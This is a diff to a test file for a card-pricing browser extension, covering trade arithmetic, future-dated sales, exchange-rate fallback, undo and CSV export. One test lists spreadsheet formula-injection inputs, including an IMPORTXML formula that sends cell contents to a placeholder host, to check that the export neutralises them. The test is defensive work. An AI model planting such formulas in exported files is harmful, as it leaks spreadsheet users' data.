@@ -18,6 +18,9 @@ global.chrome = {
 };
 
 const bg = require("./background.js");
+// The content script's money arithmetic and printed document are pure and exported for
+// exactly this: the customer-facing sheet must be held to the same standard as the CSV.
+const ui = require("./content.js");
 
 // no network in tests; the FX path is exercised through its failure branch
 global.fetch = () => { throw new Error("offline in tests"); };
@@ -772,6 +775,391 @@ async function main() {
     assert.strictEqual(bg.looksLoggedOut(page(120, 25, "Yes")), false);
     passed++;
     console.log("ok  (async) looksLoggedOut tells truncation apart from a quiet product");
+  }
+
+  // 28 - the printed sheet must add up. trade_cad was rounded to the cent while
+  // trade_total was computed from the UNROUNDED unit, so a customer-facing document
+  // disagreed with its own arithmetic: 12.99 at 65% printed 8.44 a copy and 25.33 for
+  // three, when 8.44 x 3 is 25.32. At a 65% rate, 29 of 60 multi-copy rows were wrong.
+  {
+    // every combination that used to drift, checked on all three output paths
+    const cases = [
+      { cad: "12.99", pct: 65, qty: 3 },
+      { cad: "7.35", pct: 55, qty: 4 },
+      { cad: "19.99", pct: 45, qty: 7 },
+      { cad: "0.99", pct: 33, qty: 9 },
+      { cad: "104.50", pct: 62.5, qty: 2 }
+    ];
+    for (const c of cases) {
+      const row = { name: "X", set: "S", number: "1", printing: "Holofoil",
+        condition: "Near Mint", avg_usd: "1.00", cad: c.cad, qty: c.qty,
+        _samples: 5, _oldest: "2026-07-20" };
+
+      const dec = bg.withTrade([row], c.pct)[0];
+      const unit = Number(dec.trade_cad);
+      assert.strictEqual(dec.trade_total, (unit * c.qty).toFixed(2),
+        `export: ${c.cad} at ${c.pct}% x${c.qty} - total must be the ROUNDED unit x qty`);
+
+      // clipboard is the same numbers, not a second implementation
+      const tsv = bg.toDelimited([dec], "\t", bg.EXPORT_COLUMNS).split("\r\n")[1].split("\t");
+      const at = c2 => tsv[bg.EXPORT_COLUMNS.indexOf(c2)];
+      assert.strictEqual(at("trade_cad"), dec.trade_cad);
+      assert.strictEqual(at("trade_total"), dec.trade_total);
+
+      // ...and so is the printed sheet
+      assert.strictEqual(ui.tradeUnit(row, c.pct).toFixed(2), dec.trade_cad,
+        "print unit agrees with the export unit");
+      assert.strictEqual(ui.tradeLine(row, c.pct).toFixed(2), dec.trade_total,
+        "print line total agrees with the export line total");
+    }
+
+    // the whole document: every line total, and the footer, to the cent
+    const rows = [
+      { name: "Charizard", set: "Base", printing: "Holofoil", condition: "Near Mint",
+        cad: "12.99", qty: 3, _samples: 5, _oldest: "2026-07-20", _fx_rate: "1.3750" },
+      { name: "Pikachu", set: "Base", printing: "Normal", condition: "Damaged",
+        cad: "7.35", qty: 4, _samples: 5, _oldest: "2026-07-21", _fx_rate: "1.3750" }
+    ];
+    const doc = ui.printDoc(rows, 65);
+    const cells = doc.match(/<td class="n">([^<]*)<\/td>/g)
+      .map(s => s.replace(/^<td class="n">|<\/td>$/g, ""));
+    // per row: qty, pct, unit, line total
+    assert.deepStrictEqual(cells.slice(0, 4), ["3", "65%", "8.44", "25.32"],
+      "8.44 a copy and 25.32 for three - not 25.33");
+    assert.deepStrictEqual(cells.slice(4, 8), ["4", "65%", "4.78", "19.12"]);
+    assert.strictEqual(cells[8], "44.44", "the footer is the sum of the printed lines");
+    assert.strictEqual((25.32 + 19.12).toFixed(2), "44.44");
+    passed++;
+    console.log("ok  (async) the rounded unit x qty is the line total on every output path");
+  }
+
+  // 29 - one sale dated next year sorts to the top of the "5 most recent" window and IS
+  // the price. Verified turning a $10.00 average into $2007.80 with _stale false, because
+  // the row it displaced was never in the window to be judged stale.
+  {
+    const sale = (d, p) => Object.assign({}, MATCHING[0],
+      { orderDate: daysAgo(d), purchasePrice: p });
+    const real = [sale(1, 10), sale(2, 10), sale(3, 10), sale(4, 10), sale(5, 10)];
+
+    const future = real.concat([sale(-400, 9999)]);   // dated 400 days from NOW
+    const row = bg.buildRow(META, SEL, future, FX, NOW);
+    assert.strictEqual(row.avg_usd, "10.00",
+      "a sale that has not happened yet cannot dominate the average");
+    assert.strictEqual(row._samples, 5);
+    assert.strictEqual(row._oldest, daysAgo(5).slice(0, 10));
+
+    assert.strictEqual(bg.isUsableSale(sale(-400, 1), NOW), false, "next year: invalid");
+    assert.strictEqual(bg.isUsableSale(sale(-2, 1), NOW), false, "two days ahead: invalid");
+    // a day of clock and timezone skew is tolerated - that is not a garbage row
+    assert.strictEqual(bg.isUsableSale(sale(-0.5, 1), NOW), true, "12h ahead: clock skew");
+    assert.strictEqual(bg.isUsableSale(sale(0, 1), NOW), true);
+    // absurdly old is equally unusable
+    assert.strictEqual(bg.isUsableSale(sale(365 * 20, 1), NOW), false, "20 years old");
+    assert.strictEqual(bg.isUsableSale(sale(400, 1), NOW), true, "merely stale is still real");
+
+    // and it is counted as invalid, exactly like a null price
+    const counted = await bg.collectSales("1", SEL, () => Promise.resolve({
+      previousPage: "", nextPage: "", resultCount: 2, totalResults: 2,
+      data: [sale(-400, 9999), MATCHING[0]] }));
+    assert.strictEqual(counted.invalid, 1, "the future-dated sale is counted as invalid");
+    assert.strictEqual(counted.matched.length, 1);
+    passed++;
+    console.log("ok  (async) a future-dated sale is rejected, not treated as the newest");
+  }
+
+  // 30 - the injection guard must not corrupt real card names. "+2 Mace", "-1/-1 Counter"
+  // and "@Ninja" are Magic cards, and every one of them round-tripped out of the CSV and
+  // the clipboard with an apostrophe glued to the front.
+  {
+    // an RFC4180 reader: what a spreadsheet actually sees, not what we hoped we wrote
+    const parseCsv = text => text.split("\r\n").map(line => {
+      const out = [];
+      let cur = "", q = false;
+      for (let i = 0; i < line.length; i++) {
+        const ch = line[i];
+        if (q) {
+          if (ch === '"' && line[i + 1] === '"') { cur += '"'; i++; }
+          else if (ch === '"') q = false;
+          else cur += ch;
+        } else if (ch === '"') q = true;
+        else if (ch === ",") { out.push(cur); cur = ""; }
+        else cur += ch;
+      }
+      out.push(cur);
+      return out;
+    });
+
+    const real = ["+2 Mace", "-1/-1 Counter", "@Ninja", "+2 Mace of the Valiant",
+                  "-7 Ultimate", "@Home", "+1/+1 Counter", "+X Spell", "@ the Gates",
+                  "-1/-1 Counter (Foil)", "@Ninja-1", "Charizard ex - 223/197"];
+    for (const name of real) {
+      const row = Object.assign(bg.buildRow(META, SEL, MATCHING, FX, NOW), { name });
+      const back = parseCsv(bg.toDelimited([row], ","))[1][0];
+      assert.strictEqual(back, name, `${name} must round-trip through the CSV`);
+      const tsvName = bg.toDelimited([row], "\t").split("\r\n")[1].split("\t")[0];
+      assert.strictEqual(tsvName, name, `${name} must round-trip through the clipboard`);
+      assert.strictEqual(bg.neutralise(name), name, `${name} must survive untouched`);
+    }
+
+    // and the protection is still real
+    const evil = ['=HYPERLINK("http://x","click")', '=IMPORTXML(CONCAT("//x?",A1),"//a")',
+                  "@SUM(1,2)", "=1+1", "+1+1", "-2+3", "+A1*2", "-B7", "-(1+2)",
+                  "@AA10:B4", "+$A$1*2", "\tsneaky", "\r=1+1"];
+    for (const name of evil) {
+      const row = Object.assign(bg.buildRow(META, SEL, MATCHING, FX, NOW), { name });
+      assert.strictEqual(parseCsv(bg.toDelimited([row], ","))[1][0], "'" + name,
+        `${name} arrives in the sheet as inert text`);
+      assert.strictEqual(bg.neutralise(name)[0], "'", `${name} must be neutralised`);
+    }
+    passed++;
+    console.log("ok  (async) real card names survive the guard; formulas still do not");
+  }
+
+  // 31 - the sheet used to strip every confidence signal it collected, so a $400 card
+  // priced off ONE sale months ago exported identically to one backed by five recent ones.
+  {
+    chrome.storage.local._d = {};
+    const key = "99|Holofoil|Near Mint|English";
+    await bg.handle({ type: "restore", store: { [key]: {
+      name: "Black Lotus", set: "Alpha", number: "232", printing: "Holofoil",
+      condition: "Near Mint", _language: "English", avg_usd: "400.00", cad: "550.00",
+      qty: 1, _samples: 1, _oldest: "2026-02-01", _stale: true,
+      _fx_rate: "1.3750", _addedAt: "2026-07-20T00:00:00.000Z"
+    } } });
+    await bg.handle({ type: "setGlobalPct", pct: "60" });
+
+    assert.ok(bg.EXPORT_COLUMNS.includes("samples"), "samples is an exported column");
+    assert.ok(bg.EXPORT_COLUMNS.includes("oldest"), "oldest is an exported column");
+    const copy = await bg.handle({ type: "copyText" });
+    const [head, line] = copy.text.split("\r\n");
+    assert.deepStrictEqual(head.split("\t"), bg.EXPORT_COLUMNS);
+    const cell = c => line.split("\t")[bg.EXPORT_COLUMNS.indexOf(c)];
+    assert.strictEqual(cell("samples"), "1", "one sale, and the sheet says so");
+    assert.strictEqual(cell("oldest"), "2026-02-01");
+
+    // the print sheet states the rate, the range and the counts it was built from
+    const rows = (await bg.handle({ type: "list" })).rows;
+    const doc = ui.printDoc(rows, 60);
+    assert.ok(/60% of market/.test(doc), "the applied percent is on the sheet");
+    assert.ok(/1\.3750/.test(doc), "the exchange rate used is on the sheet");
+    assert.ok(/fewer than 3 sales/.test(doc), "thin rows are counted");
+    assert.ok(/over 60 days old/.test(doc), "stale rows are counted");
+    assert.ok(/2026-02-01/.test(doc), "the date range of the sales used is on the sheet");
+    assert.ok(ui.lowSamples(rows[0]), "and the drawer flags the row rather than hiding it");
+
+    // a collection built across days carries several rates, and the sheet says which
+    const two = rows.concat([Object.assign({}, rows[0], {
+      _fx_rate: "1.4200", _fx_date: "2026-07-10", _oldest: "2026-07-25",
+      _samples: 5, _stale: false })]);
+    const doc2 = ui.printDoc(two, 60);
+    assert.ok(/2 different rates/.test(doc2), "mixed exchange rates are declared");
+    assert.ok(/1\.4200/.test(doc2));
+    await bg.handle({ type: "setGlobalPct", pct: "100" });
+    passed++;
+    console.log("ok  (async) samples and oldest are exported; the sheet states its basis");
+  }
+
+  // 32 - FX has one job in a tool that hands somebody money. One provider with a
+  // worker-lifetime memo was a single point of failure AND a cache that never survived
+  // the ~30s idle shutdown to be used.
+  {
+    chrome.storage.local._d = {};
+    const hits = [];
+    global.fetch = async (url) => {
+      hits.push(url);
+      if (url.includes("er-api")) throw new Error("provider down");
+      return { ok: true, json: async () => ({ base: "USD", date: "2026-07-24",
+                                              rates: { CAD: 1.3712 } }) };
+    };
+
+    const fx = await bg.getFx();
+    assert.strictEqual(fx.rate, 1.3712, "the fallback provider answered");
+    assert.strictEqual(fx.src, "frankfurter");
+    assert.ok(hits[0].includes("er-api"), "the primary is still tried first");
+    assert.ok(hits[1].includes("frankfurter.dev"));
+    // ECB publishes on weekdays only, so a weekend rate is legitimately days old. The
+    // rate's own date ships, not just the moment we fetched it.
+    assert.strictEqual(fx.date, "2026-07-24", "the rate's own date, not the fetch time");
+    assert.notStrictEqual(fx.date, fx.at.slice(0, 10));
+
+    // the win is persisted, so a restarted worker reads it instead of refetching. There
+    // is no in-memory state to clear: chrome.storage.local IS the cache.
+    const stored = (await chrome.storage.local.get("fx")).fx;
+    assert.strictEqual(stored.rate, 1.3712);
+    hits.length = 0;
+    global.fetch = () => { throw new Error("worker restarted, both providers down"); };
+    const again = await bg.getFx();
+    assert.strictEqual(again.rate, 1.3712, "cache survives a simulated worker restart");
+    assert.strictEqual(again.date, "2026-07-24");
+    assert.strictEqual(hits.length, 0, "and it did not touch the network to do it");
+
+    // a row built off it carries the rate's date and its source
+    const row = bg.buildRow(META, SEL, MATCHING, again, NOW);
+    assert.strictEqual(row._fx_rate, "1.3712");
+    assert.strictEqual(row._fx_date, "2026-07-24");
+    assert.strictEqual(row._fx_src, "frankfurter");
+
+    // nothing cached and everything down is still a blank cad, never a made-up rate
+    chrome.storage.local._d = {};
+    const none = await bg.getFx();
+    assert.strictEqual(none.rate, null);
+    assert.strictEqual(bg.buildRow(META, SEL, MATCHING, none, NOW).cad, "");
+
+    global.fetch = () => { throw new Error("offline in tests"); };
+    passed++;
+    console.log("ok  (async) FX falls back to the second provider and persists the rate");
+  }
+
+  // 33 - undo is allowed to be partial, and the caller threw the answer away. "Clear,
+  // re-collect one card, Undo" silently dropped that row's qty and % override.
+  {
+    chrome.storage.local._d = {};
+    await bg.collect({ productId: "60", sel: SEL, meta: META }, page5);
+    const back = await bg.collect({ productId: "61", sel: SEL, meta: META }, page5);
+    const cleared = await bg.handle({ type: "clear" });
+    // re-collect one of them inside the undo window, with edits of its own
+    await bg.collect({ productId: "61", sel: SEL, meta: META }, page5);
+    await bg.handle({ type: "setQty", key: back.key, qty: "6" });
+
+    const res = await bg.handle({ type: "restore", store: cleared.prev, keys: cleared.keys });
+    assert.strictEqual(res.restored, 1);
+    assert.strictEqual(res.kept, 1, "the re-collected row was left as it was");
+    assert.strictEqual(ui.undoOutcome(res), "Restored 1 row · 1 left as it was",
+      "and the user is told, rather than the response being discarded");
+    assert.strictEqual((await bg.handle({ type: "list" })).rows
+      .find(r => r.key === back.key).qty, 6, "its edits are intact, not rolled back");
+
+    // a total undo needs no words
+    assert.strictEqual(ui.undoOutcome({ ok: true, restored: 3, kept: 0 }), null);
+    assert.strictEqual(ui.undoOutcome({ ok: false }), null);
+    assert.strictEqual(ui.undoOutcome({ ok: true, restored: 0, kept: 2 }),
+      "Restored 0 rows · 2 left as they were");
+    passed++;
+    console.log("ok  (async) a partial undo is surfaced instead of silently dropping rows");
+  }
+
+  // 34 - two paths the reviewer found correct but untested, so nothing was holding them
+  // there: restore honouring msg.keys, and a per-row 0% override.
+  {
+    // restore must put back ONLY the named keys, never the whole snapshot
+    chrome.storage.local._d = {};
+    const snap = {
+      "a|x": { name: "A", _addedAt: "2026-07-01T00:00:00.000Z", cad: "1.00", qty: 1 },
+      "b|x": { name: "B", _addedAt: "2026-07-02T00:00:00.000Z", cad: "2.00", qty: 1 },
+      "c|x": { name: "C", _addedAt: "2026-07-03T00:00:00.000Z", cad: "3.00", qty: 1 }
+    };
+    const some = await bg.handle({ type: "restore", store: snap, keys: ["a|x", "c|x"] });
+    assert.strictEqual(some.restored, 2);
+    assert.deepStrictEqual((await bg.handle({ type: "list" })).rows.map(r => r.key).sort(),
+      ["a|x", "c|x"], "only the named keys came back");
+
+    // a key named but absent from the snapshot is skipped, not invented
+    const ghost = await bg.handle({ type: "restore", store: snap, keys: ["zz|x"] });
+    assert.strictEqual(ghost.restored, 0);
+    assert.strictEqual((await bg.handle({ type: "count" })).count, 2);
+
+    // no keys at all means the whole snapshot, for a seeding or older caller
+    await bg.handle({ type: "restore", store: snap });
+    assert.strictEqual((await bg.handle({ type: "count" })).count, 3);
+
+    // a per-row 0% is a real answer ("we are not paying for this one"), and it must
+    // beat a non-zero house rate rather than being read as "no override"
+    await bg.handle({ type: "setGlobalPct", pct: "70" });
+    assert.strictEqual((await bg.handle({ type: "setPct", key: "b|x", pct: "0" })).pct, 0);
+    const rows = (await bg.handle({ type: "list" })).rows;
+    assert.strictEqual(rows.find(r => r.key === "b|x")._pct, 0, "stored as 0, not dropped");
+
+    const by = {};
+    for (const r of bg.withTrade(rows, 70)) by[r.key] = r;
+    assert.strictEqual(by["b|x"].pct, "0");
+    assert.strictEqual(by["b|x"].trade_cad, "0.00", "0% pays zero");
+    assert.strictEqual(by["b|x"].trade_total, "0.00");
+    assert.strictEqual(by["a|x"].trade_cad, "0.70", "and the other rows still follow 70%");
+
+    // the drawer and the print sheet agree with the export
+    const zero = rows.find(r => r.key === "b|x");
+    assert.strictEqual(ui.pctFor(zero, 70), 0, "0 is an override, not a missing one");
+    assert.strictEqual(ui.tradeUnit(zero, 70), 0);
+    assert.ok(/<td class="n">0%<\/td>/.test(ui.printDoc([zero], 70)),
+      "and the printed sheet says 0%, so nobody argues about it later");
+
+    // clearing it puts the row back on the house rate
+    await bg.handle({ type: "setPct", key: "b|x", pct: "" });
+    assert.strictEqual(bg.withTrade((await bg.handle({ type: "list" })).rows, 70)
+      .find(r => r.key === "b|x").trade_cad, "1.40");
+    await bg.handle({ type: "setGlobalPct", pct: "100" });
+    passed++;
+    console.log("ok  (async) restore honours msg.keys; a per-row 0% is honoured everywhere");
+  }
+
+  // 35 - the house rate is 100% by default, so a fresh install quotes full retail with
+  // nothing anywhere saying so. It must be an explicit choice before anything prints.
+  {
+    chrome.storage.local._d = {};
+    const fresh = await bg.handle({ type: "list" });
+    assert.strictEqual(fresh.pct, bg.DEFAULT_PCT);
+    assert.strictEqual(fresh.pctSet, false,
+      "an untouched install has NOT chosen a house rate, whatever the default reads");
+
+    // blanking the box is not a choice either
+    const blank = await bg.handle({ type: "setGlobalPct", pct: "" });
+    assert.strictEqual(blank.pctSet, false);
+    assert.strictEqual((await bg.handle({ type: "list" })).pctSet, false);
+
+    // typing one is
+    const chosen = await bg.handle({ type: "setGlobalPct", pct: "65" });
+    assert.strictEqual(chosen.pctSet, true);
+    assert.strictEqual((await bg.handle({ type: "list" })).pct, 65);
+
+    // even choosing 100 explicitly counts - it is a decision, not a default
+    await bg.handle({ type: "setGlobalPct", pct: "100" });
+    assert.strictEqual((await bg.handle({ type: "list" })).pctSet, true);
+    passed++;
+    console.log("ok  (async) the house rate is an explicit first-run choice, not a default");
+  }
+
+  // 36 - refresh-all reported counts, never which rows failed, and could not be stopped.
+  {
+    chrome.storage.local._d = {};
+    const a = await bg.collect({ productId: "70", sel: SEL, meta: META }, page5);
+    const b = await bg.collect({ productId: "71", sel: SEL, meta: META }, page5);
+    const c = await bg.collect({ productId: "72", sel: SEL, meta: META }, page5);
+
+    // the middle product 404s
+    const res = await bg.handle({ type: "refreshAll" }, (id) => {
+      if (id === "71") return Promise.reject(new Error("latestsales 404"));
+      return page5();
+    });
+    assert.strictEqual(res.refreshed, 2);
+    assert.strictEqual(res.failed, 1);
+    assert.deepStrictEqual(res.failedKeys, [b.key],
+      "the run names WHICH row failed, not just how many");
+    assert.ok(!res.failedKeys.includes(a.key) && !res.failedKeys.includes(c.key));
+
+    // cancel: the worker stops on the next row and says how many it never reached
+    chrome.storage.local._d = {};
+    for (const id of ["80", "81", "82", "83"]) {
+      await bg.collect({ productId: id, sel: SEL, meta: META }, page5);
+    }
+    let seen = 0;
+    const stopped = await bg.handle({ type: "refreshAll" }, async () => {
+      seen++;
+      if (seen === 2) await bg.handle({ type: "cancelRefresh" });
+      return { previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
+               data: MATCHING };
+    });
+    assert.strictEqual(stopped.cancelled, true, "the run stopped when asked");
+    assert.strictEqual(stopped.refreshed, 2);
+    assert.strictEqual(stopped.remaining, 2, "and says how many it never reached");
+    assert.strictEqual(stopped.partial, true, "a cancelled run is never reported as clean");
+    assert.strictEqual(stopped.count, 4, "cancelling drops nothing");
+
+    // the next run starts fresh rather than inheriting the cancellation
+    const after = await bg.handle({ type: "refreshAll" }, page5);
+    assert.strictEqual(after.cancelled, false);
+    assert.strictEqual(after.refreshed, 4);
+    passed++;
+    console.log("ok  (async) refresh-all names the rows that failed and can be cancelled");
   }
 
   console.log(`\n${passed} assertion groups passed`);
